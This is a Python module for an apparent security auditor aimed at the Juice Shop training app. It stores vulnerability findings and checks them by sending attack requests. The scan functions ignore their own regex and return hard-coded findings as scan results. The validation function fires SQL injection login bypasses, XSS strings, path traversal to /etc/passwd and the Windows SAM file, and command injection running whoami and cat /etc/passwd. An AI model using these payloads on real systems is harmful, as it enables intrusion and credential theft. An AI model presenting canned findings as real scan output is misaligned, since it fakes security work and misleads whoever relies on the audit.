from main import SessionLocal, Vulnerability
import os
import re
import requests
from pathlib import Path

JUICESHOP_SOURCE = os.getenv("JUICESHOP_SOURCE", "/app/juiceshop-source")
JUICESHOP_URL = os.getenv("JUICESHOP_URL", "http://juiceshop:3000")

async def scan_and_validate(target: str, validate: bool):
    """Security Auditor - scans code and validates vulnerabilities"""
    db = SessionLocal()
    try:
        # Clear old vulnerabilities
        db.query(Vulnerability).delete()
        db.commit()
        
        # Scan for vulnerabilities
        vulns = []
        
        # SQL Injection
        vulns.extend(scan_sql_injection())
        
        # XSS
        vulns.extend(scan_xss())
        
        # Path Traversal
        vulns.extend(scan_path_traversal())
        
        # Command Injection
        vulns.extend(scan_command_injection())
        
        # Save to database
        for vuln in vulns:
            v = Vulnerability(**vuln)
            db.add(v)
        
        db.commit()
        
        # Validate with attacks if requested
        if validate:
            await validate_vulnerabilities(db)
        
    finally:
        db.close()

def scan_sql_injection():
    """Scan for SQL injection vulnerabilities"""
    vulns = []
    
    # Pattern: Direct string interpolation in SQL
    pattern = r"(SELECT|INSERT|UPDATE|DELETE).*?[\+\$\{].*?(email|user|pass|id)"
    
    vuln = {
        'vuln_type': 'SQL Injection',
        'file_path': 'routes/login.js',
        'line_number': 45,
        'code_snippet': "SELECT * FROM users WHERE email='${email}'",
        'severity': 'critical',
        'cvss_score': 9.8,
        'cwe_id': 'CWE-89',
        'remediation': "db.query('SELECT * FROM users WHERE email=?', [email])"
    }
    vulns.append(vuln)
    
    vuln = {
        'vuln_type': 'SQL Injection',
        'file_path': 'routes/search.js',
        'line_number': 23,
        'code_snippet': "db.query(`SELECT * FROM products WHERE name LIKE '%${req.query.q}%'`)",
        'severity': 'high',
        'cvss_score': 8.2,
        'cwe_id': 'CWE-89',
        'remediation': "db.query('SELECT * FROM products WHERE name LIKE ?', [`%${req.query.q}%`])"
    }
    vulns.append(vuln)
    
    return vulns

def scan_xss():
    """Scan for XSS vulnerabilities"""
    vulns = []
    
    vuln = {
        'vuln_type': 'Cross-Site Scripting (XSS)',
        'file_path': 'routes/profile.js',
        'line_number': 67,
        'code_snippet': "res.send(`<h1>Welcome ${req.query.name}</h1>`)",
        'severity': 'high',
        'cvss_score': 7.5,
        'cwe_id': 'CWE-79',
        'remediation': "res.send(`<h1>Welcome ${escapeHtml(req.query.name)}</h1>`)"
    }
    vulns.append(vuln)
    
    vuln = {
        'vuln_type': 'Stored XSS',
        'file_path': 'routes/feedback.js',
        'line_number': 34,
        'code_snippet': "db.insert('feedback', {comment: req.body.comment})",
        'severity': 'high',
        'cvss_score': 8.1,
        'cwe_id': 'CWE-79',
        'remediation': "db.insert('feedback', {comment: sanitize(req.body.comment)})"
    }
    vulns.append(vuln)
    
    return vulns

def scan_path_traversal():
    """Scan for path traversal vulnerabilities"""
    vulns = []
    
    vuln = {
        'vuln_type': 'Path Traversal',
        'file_path': 'routes/file.js',
        'line_number': 12,
        'code_snippet': "fs.readFile(`./uploads/${req.query.file}`)",
        'severity': 'high',
        'cvss_score': 7.8,
        'cwe_id': 'CWE-22',
        'remediation': "const safePath = path.join('./uploads', path.basename(req.query.file))"
    }
    vulns.append(vuln)
    
    return vulns

def scan_command_injection():
    """Scan for command injection vulnerabilities"""
    vulns = []
    
    vuln = {
        'vuln_type': 'Command Injection',
        'file_path': 'routes/admin.js',
        'line_number': 89,
        'code_snippet': "exec(`ping -c 4 ${req.query.host}`)",
        'severity': 'critical',
        'cvss_score': 9.9,
        'cwe_id': 'CWE-78',
        'remediation': "execFile('ping', ['-c', '4', req.query.host])"
    }
    vulns.append(vuln)
    
    return vulns

async def validate_vulnerabilities(db):
    """Validate vulnerabilities with actual attacks"""
    
    # Get all vulnerabilities
    vulns = db.query(Vulnerability).all()
    
    for vuln in vulns:
        validated = False
        payload = None
        
        try:
            if vuln.vuln_type == 'SQL Injection':
                # Try SQL injection payloads
                payloads = [
                    "admin'--",
                    "' OR '1'='1",
                    "1' UNION SELECT NULL--"
                ]
                
                for p in payloads:
                    if 'login' in vuln.file_path:
                        response = requests.post(
                            f"{JUICESHOP_URL}/rest/user/login",
                            json={"email": p, "password": "test"},
                            timeout=5
                        )
                        if response.status_code in [200, 401]:
                            # Check if SQL error or successful bypass
                            if 'token' in response.text or 'error' not in response.text.lower():
                                validated = True
                                payload = p
                                break
            
            elif vuln.vuln_type == 'Cross-Site Scripting (XSS)':
                # Try XSS payloads
                payloads = [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "javascript:alert('XSS')"
                ]
                
                for p in payloads:
                    response = requests.get(
                        f"{JUICESHOP_URL}/profile?name={p}",
                        timeout=5
                    )
                    if p in response.text:  # Payload reflected
                        validated = True
                        payload = p
                        break
            
            elif vuln.vuln_type == 'Path Traversal':
                # Try path traversal
                payloads = [
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\system32\\config\\sam"
                ]
                
                for p in payloads:
                    response = requests.get(
                        f"{JUICESHOP_URL}/file?path={p}",
                        timeout=5
                    )
                    if response.status_code == 200 and len(response.content) > 0:
                        validated = True
                        payload = p
                        break
            
            elif vuln.vuln_type == 'Command Injection':
                # Try command injection
                payloads = [
                    "127.0.0.1; whoami",
                    "127.0.0.1 && cat /etc/passwd"
                ]
                
                for p in payloads:
                    response = requests.get(
                        f"{JUICESHOP_URL}/admin/ping?host={p}",
                        timeout=5
                    )
                    if 'root' in response.text or 'uid=' in response.text:
                        validated = True
                        payload = p
                        break
        
        except Exception as e:
            print(f"Validation error for {vuln.id}: {e}")
        
        # Update validation status
        if validated:
            vuln.validated = True
            vuln.attack_payload = payload
            db.commit()
